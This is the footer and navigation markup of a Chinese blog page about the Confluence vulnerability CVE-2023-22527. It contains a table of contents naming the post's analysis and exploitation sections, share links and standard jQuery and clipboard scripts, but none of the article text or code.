    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-number">2.</span> <span class="toc-text">2. 测试一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">3. 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-text-inline-vm"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 text-inline.vm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-RCE"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-EXP"><span class="toc-number">4.</span> <span class="toc-text">4. EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8B%A6%E6%88%AA"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. 命令执行拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E9%99%90%E5%88%B6"><span class="toc-number">4.2.</span> <span class="toc-text">4.2. 绕过黑名单限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E5%9B%9E%E6%98%BE"><span class="toc-number">4.3.</span> <span class="toc-text">4.3. 回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E5%A4%B1%E8%B4%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">4.4.</span> <span class="toc-text">4.4. 添加管理员失败及绕过思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">4.5.</span> <span class="toc-text">4.5. 加载字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-1-JDK9%E4%BB%A5%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%99%90%E5%88%B6"><span class="toc-number">4.5.1.</span> <span class="toc-text">4.5.1 JDK9以上的一些限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E4%BD%BF%E7%94%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E5%92%8C%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.6.</span> <span class="toc-text">4.6. 使用类加载实现添加管理员和内存马</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&text=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&is_video=false&description=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-22527-confluecne 漏洞分析和利用链构造&body=Check out this article: http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&title=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&name=CVE-2023-22527-confluecne 漏洞分析和利用链构造&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/&t=CVE-2023-22527-confluecne 漏洞分析和利用链构造"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2017-2024
    ninefiger
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
